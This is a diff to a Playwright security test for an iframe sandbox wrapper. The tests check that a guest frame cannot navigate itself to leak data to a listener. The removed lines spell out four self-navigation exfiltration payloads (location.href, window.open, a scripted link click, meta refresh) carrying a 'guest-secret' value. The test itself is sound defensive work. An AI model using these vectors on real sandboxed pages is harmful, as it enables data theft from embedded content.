@@ -1,6 +1,7 @@
 import type { BrowserContext } from '@playwright/test';
 import { test, expect } from '../../../test/e2e/fixture';
 import { useRecorder } from '../../../test/e2e/recorder';
+import { fromPreset } from '../../../test/e2e/presets';
 
 /**
  * Research 14: the guest frame navigating itself (backlog S10 / S11, issue #6 N1 + N2).
@@ -38,31 +39,27 @@ async function watchAttacker(context: BrowserContext): Promise<string[]> {
     return reached;
 }
 
-const vectors = (target: string): Record<string, string> => ({
-    'script (location.href)': `<script>setTimeout(() => { location.href = '${target}/?d=guest-secret'; }, 50)</script>`,
-    'script (window.open _self)': `<script>setTimeout(() => { window.open('${target}/?d=guest-secret', '_self'); }, 50)</script>`,
-    'link click': `<a id="a" href="${target}/?d=guest-secret">x</a><script>setTimeout(() => document.getElementById('a').click(), 50)</script>`,
-    'meta refresh': `<meta http-equiv="refresh" content="0;url=${target}/?d=guest-secret">`,
-});
+// The vectors: the preset's code (location.href) and its variants (window.open _self, link click, meta refresh).
+const preset = fromPreset('self-navigation');
 
-for (const name of Object.keys(vectors(''))) {
-    test(`14.1 self-navigation via ${name} does not reach the network`, async ({ sandbox, page }) => {
-        await sandbox.mount();
+for (const [name, vector] of preset.payloads) {
+    test(`14.1 self-navigation via ${name === 'code' ? 'location.href' : name} does not reach the network`, async ({ sandbox, page }) => {
+        await sandbox.mount(preset.rules);
 
-        await sandbox.load(vectors(recorder.blocked)[name]!);
+        await sandbox.load(preset.aimedAt(recorder.blocked, vector));
         await page.waitForTimeout(2000); // the positive control below arrives well within this
 
         expect(recorder.paths('blocked'), 'the guest navigated itself to the listener').toEqual([]);
         expect(page.frames().map(f => f.url()).filter(url => url.startsWith(recorder.blocked))).toEqual([]);
     });
 
-    test(`14.1 positive control: ${name} from a sandboxed frame without the wrapper reaches the listener`, async ({ sandbox }) => {
+    test(`14.1 positive control: ${name === 'code' ? 'location.href' : name} from a sandboxed frame without the wrapper reaches the listener`, async ({ sandbox }) => {
         await sandbox.page.evaluate((markup) => {
             const frame = document.createElement('iframe');
             frame.setAttribute('sandbox', 'allow-scripts');
             frame.srcdoc = markup;
             document.body.appendChild(frame);
-        }, vectors(recorder.blocked)[name]!);
+        }, preset.aimedAt(recorder.blocked, vector));
         await recorder.waitFor('blocked', '/?d=guest-secret', 2000);
     });
 }
